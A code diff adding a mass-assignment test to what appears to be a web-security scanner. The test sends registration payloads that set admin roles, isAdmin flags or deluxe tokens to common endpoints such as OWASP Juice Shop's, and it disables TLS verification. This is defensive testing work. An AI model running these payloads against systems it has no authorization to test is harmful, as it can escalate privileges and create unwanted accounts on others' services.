@@ -716,6 +716,164 @@ async def test_weak_username_policy(base_url: str, auth_session: Optional[Dict[s
     except Exception as e:
         return {"status": "error", "message": str(e)}
 
+async def test_registration_mass_assignment(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    """
+    Test user registration for mass assignment / privilege escalation.
+
+    Attempts to register users with extra fields (role, isAdmin, etc.)
+    that should not be assignable by the user.
+    Also tests registration with empty/minimal fields.
+
+    OWASP Reference: WSTG-IDNT-02, WSTG-BUSL-02
+    """
+    findings = []
+    from urllib.parse import urlparse
+    parsed = urlparse(url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+    # Common registration endpoints
+    register_endpoints = [
+        "/api/Users",          # Juice Shop
+        "/api/register",
+        "/api/auth/register",
+        "/rest/user/register",
+        "/register",
+    ]
+
+    req_kwargs = {"timeout": 15, "verify": False, "follow_redirects": True}
+    if auth_session:
+        if 'cookies' in auth_session:
+            req_kwargs['cookies'] = auth_session['cookies']
+        if 'headers' in auth_session:
+            req_kwargs['headers'] = auth_session.get('headers', {})
+        elif 'token' in auth_session:
+            req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
+
+    import random, string
+    rand_suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
+
+    # Mass assignment payloads — extra fields that shouldn't be user-settable
+    mass_assign_tests = [
+        {
+            "name": "admin_role",
+            "payload": {
+                "email": f"masstest1_{rand_suffix}@test.com",
+                "password": "TestPass123!",
+                "passwordRepeat": "TestPass123!",
+                "role": "admin",
+            },
+            "check_field": "role",
+            "description": "Register with admin role",
+        },
+        {
+            "name": "isAdmin_flag",
+            "payload": {
+                "email": f"masstest2_{rand_suffix}@test.com",
+                "password": "TestPass123!",
+                "passwordRepeat": "TestPass123!",
+                "isAdmin": True,
+            },
+            "check_field": "isAdmin",
+            "description": "Register with isAdmin=true",
+        },
+        {
+            "name": "deluxe_token",
+            "payload": {
+                "email": f"masstest3_{rand_suffix}@test.com",
+                "password": "TestPass123!",
+                "passwordRepeat": "TestPass123!",
+                "deluxeToken": "valid_deluxe_token",
+                "role": "deluxe",
+            },
+            "check_field": "deluxeToken",
+            "description": "Register with deluxe membership",
+        },
+        {
+            "name": "empty_fields",
+            "payload": {
+                "email": "",
+                "password": "",
+            },
+            "check_field": None,
+            "description": "Register with empty email and password",
+        },
+    ]
+
+    async with httpx.AsyncClient(**req_kwargs) as client:
+        for endpoint in register_endpoints:
+            reg_url = f"{base_url}{endpoint}"
+
+            # First check if endpoint exists
+            try:
+                probe = await client.get(reg_url)
+                if probe.status_code == 404:
+                    continue
+            except Exception:
+                continue
+
+            for test in mass_assign_tests:
+                try:
+                    resp = await client.post(reg_url, json=test["payload"])
+
+                    if resp.status_code in (200, 201):
+                        resp_data = {}
+                        try:
+                            resp_data = resp.json()
+                        except Exception:
+                            pass
+
+                        # Check if the extra field was accepted
+                        check = test["check_field"]
+                        if check and isinstance(resp_data, dict):
+                            # Check nested 'data' field too
+                            data = resp_data.get("data", resp_data)
+                            if isinstance(data, dict) and data.get(check):
+                                findings.append({
+                                    "type": "mass_assignment",
+                                    "test": test["name"],
+                                    "endpoint": endpoint,
+                                    "severity": "critical",
+                                    "description": f"Mass assignment: {test['description']} succeeded",
+                                    "evidence": str(resp_data)[:300],
+                                    "recommendation": "Whitelist allowed fields in registration endpoint",
+                                })
+
+                        # Empty field test
+                        if test["name"] == "empty_fields" and resp.status_code in (200, 201):
+                            findings.append({
+                                "type": "empty_registration",
+                                "test": test["name"],
+                                "endpoint": endpoint,
+                                "severity": "medium",
+                                "description": "Registration accepted with empty email and password",
+                                "evidence": str(resp_data)[:300],
+                            })
+
+                        # Even if check field not in response, registration succeeded with extra params
+                        if check and resp.status_code == 201:
+                            findings.append({
+                                "type": "extra_fields_accepted",
+                                "test": test["name"],
+                                "endpoint": endpoint,
+                                "severity": "high",
+                                "description": f"Registration accepted extra field '{check}' without rejection",
+                                "evidence": str(resp_data)[:300],
+                            })
+                except Exception:
+                    continue
+
+    return {
+        "status": "success",
+        "data": {
+            "vulnerable": len(findings) > 0,
+            "findings": findings,
+            "endpoints_tested": len(register_endpoints),
+            "tests_run": len(mass_assign_tests),
+            "description": "Mass assignment testing on user registration endpoints",
+        }
+    }
+
+
 # Entrypoint (tidak ada perubahan)
 # if __name__ == "__main__":  # REMOVED: Using JSON-RPC adapter`n#     mcp.run(transport="stdio")
 
